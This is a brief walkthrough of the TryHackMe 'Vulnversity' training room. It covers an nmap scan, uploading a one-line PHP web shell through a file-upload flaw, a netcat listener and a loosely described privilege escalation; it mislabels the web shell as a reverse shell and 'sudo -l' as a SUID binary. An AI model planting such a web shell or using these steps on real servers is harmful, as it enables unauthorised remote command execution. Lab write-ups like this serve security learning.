# 🛡️ TryHackMe - Vulnversity Walkthrough

## 📎 Room Link
[Vulnversity](https://tryhackme.com/room/vulnversity)

## 🖥 Target IP
10.10.X.X

## 🔍 Nmap Scan

```bash
nmap -sC -sV -oN vulnversity-nmap.txt 10.10.X.X
```

Found multiple services: FTP, SSH, HTTP, etc.

## 🧠 Exploitation

Uploaded reverse shell via file upload vuln.

```php
<?php
  system($_GET['cmd']);
?>
```

Used listener:
```bash
nc -lvnp 4444
```

## 🔐 Privilege Escalation

Found SUID binary `sudo -l` → used for escalation.

---

## ✅ Flags

- [x] User.txt
- [x] Root.txt
